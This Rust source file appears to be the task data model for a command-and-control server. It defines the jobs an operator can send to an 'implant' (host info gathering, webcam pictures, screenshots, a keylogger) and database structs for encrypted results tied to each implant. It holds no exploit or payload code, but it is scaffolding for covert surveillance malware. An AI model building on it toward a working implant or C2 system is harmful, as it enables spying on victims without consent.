use crate::schema::*;
use chrono;
use diesel::{Associations, Identifiable, Insertable, Queryable};
use serde::{Deserialize, Serialize};
use std::str::FromStr;
use uuid;

use crate::models::implant::Implant;

#[derive(Debug, PartialEq)]
pub enum Tasks {
    GetInfo,
    TakePicture,
    TakeScreenshot,
    Keylogger,
}

impl FromStr for Tasks {
    type Err = ();

    fn from_str(input: &str) -> Result<Self, Self::Err> {
        match input {
            "get_info" => Ok(Tasks::GetInfo),
            "take_picture" => Ok(Tasks::TakePicture),
            "take_screenshot" => Ok(Tasks::TakeScreenshot),
            "keylogger" => Ok(Tasks::Keylogger),
            _ => Err(()),
        }
    }
}

#[derive(Debug, Identifiable, Associations, Serialize, Deserialize, Insertable, Queryable)]
#[primary_key(task_id)]
#[belongs_to(Implant)]
#[table_name = "tasks"]
pub struct Task {
    pub task_id: uuid::Uuid,
    pub task: String,
    pub task_created_at: chrono::NaiveDateTime,
    pub task_status: String,
    pub result_content: Option<String>,
    pub result_nonce: Option<String>,
    pub result_created_at: Option<chrono::NaiveDateTime>,
    pub implant_id: uuid::Uuid,
}

impl Task {
    pub fn new(task: String, task_status: String, implant_id: uuid::Uuid) -> Self {
        Task {
            task_id: uuid::Uuid::new_v4(),
            task,
            task_created_at: chrono::Local::now().naive_local(),
            task_status,
            result_content: None,
            result_nonce: None,
            result_created_at: None,
            implant_id,
        }
    }
}

#[derive(Deserialize)]
pub struct AddTaskRequest {
    pub implant_id: uuid::Uuid,
    pub task: String,
}

#[derive(Debug, Serialize)]
pub struct ResponseTask {
    pub task_id: uuid::Uuid,
    pub task: String,
    pub implant_id: uuid::Uuid,
}

impl ResponseTask {
    pub fn new(task_id: uuid::Uuid, task: String, implant_id: uuid::Uuid) -> Self {
        ResponseTask {
            task_id,
            task,
            implant_id,
        }
    }
}

#[derive(Serialize)]
pub struct AllTasksResponse {
    pub tasks: Vec<Task>,
}

impl AllTasksResponse {
    pub fn new(tasks: Vec<Task>) -> Self {
        AllTasksResponse { tasks }
    }
}

// #[derive(Deserialize)]
// pub struct GetInfoResponse {
//     pub external_ip_address: String,
//     pub internal_ip_address: String,
//     pub os_type: String,
//     pub machine_user: String,
//     pub machine_name: String,
//     pub process_name: String,
//     pub pid: u32,
//     pub architecture: String,
//     pub implant_id: String,
// }

// impl GetInfoResponse {
//     pub fn new(
//         external_ip_address: String,
//         internal_ip_address: String,
//         os_type: String,
//         machine_user: String,
//         machine_name: String,
//         process_name: String,
//         pid: u32,
//         architecture: String,
//         implant_id: String,
//     ) -> Self {
//         GetInfoResponse {
//             external_ip_address,
//             internal_ip_address,
//             os_type,
//             machine_user,
//             machine_name,
//             process_name,
//             pid,
//             architecture,
//             implant_id,
//         }
//     }
// }
